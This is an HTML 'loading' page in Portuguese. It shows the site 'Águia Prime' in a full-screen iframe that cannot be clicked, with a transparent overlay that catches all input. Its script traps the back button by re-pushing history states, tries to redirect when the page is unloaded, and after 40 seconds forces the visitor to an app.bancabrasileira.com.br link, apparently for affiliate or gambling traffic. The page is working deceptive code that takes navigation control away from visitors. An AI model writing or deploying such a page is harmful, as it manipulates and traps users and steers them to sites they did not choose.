<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <meta http-equiv="refresh" content="40;url=https://app.bancabrasileira.com.br/pr/bIwlp2AU">
    <title>Carregando</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        .iframe-container {
            position: relative;
            width: 100%;
            height: 100vh; /* Ocupa a altura total da tela */
        }

        iframe {
            width: 100%;
            height: 100%;
            border: none;
            pointer-events: none; /* Impede interação direta com o iframe */
        }

        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: transparent; /* Camada transparente */
            z-index: 10;
            pointer-events: auto; /* Intercepta todos os eventos de clique e teclado */
        }
    </style>
    <script>
        // Função para redirecionar
        function redirect() {
            window.location.replace("https://app.bancabrasileira.com.br/pr/bIwlp2AU");
        }

        // Redireciona após 40 segundos
        setTimeout(redirect, 40000); // 40 segundos em milissegundos

        // Adiciona estados ao histórico para bloquear o botão de voltar
        history.pushState(null, null, window.location.href);
        history.pushState(null, null, window.location.href); // Adiciona múltiplos estados

        // Captura tentativas de voltar no navegador
        window.onpopstate = function () {
            history.pushState(null, null, window.location.href); // Reinsere estado
            redirect();
        };

        // Garante redirecionamento ao tentar recarregar
        window.addEventListener('beforeunload', function () {
            redirect();
        });
    </script>
</head>
<body>
    <div class="iframe-container">
        <iframe src="https://app.aguiaprime119000.com" title="Águia Prime"></iframe>
        <div class="overlay"></div>
    </div>
</body>
</html>
